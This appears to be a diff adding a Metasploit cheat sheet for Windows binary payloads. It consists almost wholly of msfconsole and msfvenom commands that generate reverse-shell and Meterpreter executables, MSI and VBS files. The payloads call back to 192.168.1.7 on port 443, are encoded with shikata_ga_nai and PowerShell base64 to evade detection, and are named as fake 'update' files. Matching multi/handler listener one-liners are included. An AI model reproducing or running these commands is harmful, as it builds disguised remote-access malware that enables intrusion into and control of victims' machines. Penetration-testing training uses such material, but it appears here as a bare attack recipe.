@@ -1,0 +1,225 @@
+**Windows Binary Payloads (Metasploit)**
+
+Windows binary payload generation, listeners, and msfvenom usage for reverse shells and Meterpreter payloads.
+
+## Payload: windows/shell/reverse_tcp
+
+- Load the payload module
+
+```
+use payload/windows/shell/reverse_tcp
+
+```
+
+- Configure listener details
+
+```
+set LHOST 192.168.1.7
+
+```
+
+```
+set LPORT 443
+
+```
+
+- View payload generation options
+
+```
+generate -h
+
+```
+
+- Generate a basic EXE payload
+
+```
+generate -o update.exe -f exe
+
+```
+
+- Generate EXE with bad characters and PowerShell encoder
+
+```
+generate -f exe -b '\\x00\\x0d\\x0a' -e 'cmd/powershell_base64' -o update2.exe
+
+```
+
+- Generate EXE with encoding and multiple iterations
+
+```
+generate -f exe -b '\\x00\\x0d\\x0a' -e "cmd/powershell_base64" -o update3.exe -I 5
+
+```
+
+- Generate EXE using Shikata Ga Nai encoder
+
+```
+generate -f exe -b '\\x00\\x0d\\x0a' -e 'x86/shikata_ga_nai' -o update4.exe -I 2
+
+```
+
+- Generate MSI payload
+
+```
+generate -f msi -b '\\x00\\x0d\\x0a' -e "cmd/powershell_base64" -o update5.msi -I 5
+
+```
+
+## Payload: windows/shell_reverse_tcp
+
+- Load the payload module
+
+```
+use payload/windows/shell_reverse_tcp
+
+```
+
+- Configure listener details
+
+```
+set LHOST 192.168.1.7
+
+```
+
+```
+set LPORT 443
+
+```
+
+- View generation options
+
+```
+generate -h
+
+```
+
+- Generate EXE payload
+
+```
+generate -o update6.exe -f exe
+
+```
+
+## Payload: windows/meterpreter/reverse_tcp
+
+- Load the payload module
+
+```
+use payload/windows/meterpreter/reverse_tcp
+
+```
+
+- Configure listener details
+
+```
+set LHOST 192.168.1.7
+
+```
+
+```
+set LPORT 443
+
+```
+
+- Generate MSI payload
+
+```
+generate -o update7.msi -f msi
+
+```
+
+## Listener (Multi/Handler)
+
+- Start a Meterpreter listener
+
+```
+use exploit/multi/handler
+
+```
+
+```
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+```
+
+```
+set LHOST 192.168.1.7
+
+```
+
+```
+set LPORT 443
+
+```
+
+```
+exploit
+
+```
+
+- One-liner listener command
+
+```
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.7; set LPORT 443; exploit"
+
+```
+
+## Payload Generation with msfvenom
+
+- View help
+
+```
+msfvenom -h
+
+```
+
+- Generate reverse shell EXE (encoded)
+
+```
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.7 LPORT=443 -a x86 --platform windows -b '\\x00\\xff\\x0a\\x0d' -e x86/shikata_ga_nai -i 5 -f exe -o update8.exe
+
+```
+
+- Generate simple reverse shell EXE
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.7 LPORT=443 -f exe -o update9.exe
+
+```
+
+- Generate encoded reverse shell EXE
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.7 LPORT=443 -a x86 --platform windows -b '\\x00\\xff\\x0a\\x0d' -e x86/shikata_ga_nai -i 5 -f exe -o update10.exe
+
+```
+
+- Generate Meterpreter EXE
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 --platform windows -f exe -o update11.exe
+
+```
+
+- Generate Meterpreter VBS payload
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 --platform windows -b '\\x00\\xff\\x0a\\x0d' -e x86/shikata_ga_nai -i 5 -f vbs -o update12.vbs
+
+```
+
+- Redirect output to file
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 --platform windows -b '\\x00\\xff\\x0a\\x0d' -e x86/shikata_ga_nai -i 5 -f vbs > update13.vbs
+
+```
+
+## Listener (One-liner)
+
+- One-liner listener command
+
+```
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.7; set LPORT 443; exploit"
+
+```
